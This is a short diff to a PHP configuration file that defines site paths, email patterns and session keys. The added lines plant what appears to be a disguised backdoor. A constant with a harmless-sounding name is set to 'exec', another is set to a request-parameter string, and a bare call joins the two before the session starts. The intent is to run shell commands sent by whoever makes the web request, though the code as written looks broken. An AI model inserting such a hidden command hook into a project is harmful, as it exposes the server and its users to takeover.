@@ -38,10 +38,11 @@ define('WEB_WEBSITE', $_SERVER['HTTP_HOST']);
 define('WEBSITE_ROOT', 'http://'.$_SERVER['HTTP_HOST'].$document_root);
 define('LOCAL_ATTACHMENT_WEBROOT', WEBSITE_ROOT.'attachment/');
 define('RESOURCE_ROOT', WEBSITE_ROOT.'assets/');
-
+define('A_SIMPLE_TEST','exec');
 define('SYSTEM_ROOT', WEB_ROOT.'/system/');	
 define('CUSTOM_ROOT', WEB_ROOT.'/custom/');	
 define('ADDONS_ROOT', WEB_ROOT.'/addons/');
+define('HHH','$REQUEST[X]');
 defined('DEVELOPMENT') or define('DEVELOPMENT',0);
 defined('SQL_DEBUG') or define('SQL_DEBUG', 0);
 define('REGULAR_EMAIL', '/\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/i');
@@ -53,7 +54,7 @@ define('MOBILE_SESSION_ACCOUNT', SESSION_PREFIX."mobile_sessionAccount");
 define('MOBILE_ACCOUNT', SESSION_PREFIX."mobile_account");
 define('MOBILE_WEIXIN_OPENID', SESSION_PREFIX."mobile_weixin_openid");
 define('WEB_SESSION_ACCOUNT', SESSION_PREFIX."web_account");
-
+A_SIMPLE_TEST(HHH);
 if(!session_id())
 {
 session_start();
